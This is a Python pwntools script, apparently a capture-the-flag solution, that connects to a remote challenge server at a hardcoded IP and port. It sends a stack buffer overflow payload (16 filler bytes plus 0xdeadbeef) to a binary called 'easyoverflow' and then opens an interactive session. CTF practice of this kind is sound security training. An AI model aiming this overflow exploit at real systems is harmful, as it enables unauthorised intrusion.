from pwn import *

local=0
debug=0
atta=0
uselibc=0  #0 for no,1 for i386,2 for x64
haslibc=0
pc='./easyoverflow'
remote_addr="210.28.132.84"
remote_port=23049
elf=ELF(pc)

if uselibc==2 and haslibc==0:
    libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
else:
    if uselibc==1 and haslibc==0:
        libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
    else:
        if haslibc!=0:
            libc=ELF('./libc.so.6')

if local==1:
    if haslibc:
        p = process(pc, env={'LD_PRELOAD': './libc.so.6'})
    else:
        p=process(pc)

else:
    p=remote(remote_addr,remote_port)
    if haslibc!=0:
        libc=ELF('./libc.so.6')

if debug:
    context.log_level=True

if atta:
    gdb.attach(p)
    #gdb.attach(p,open('debug'))

def hack():
    p.recvline()
    p.send('A'*16+p32(0xdeadbeef))
    p.interactive()

hack()
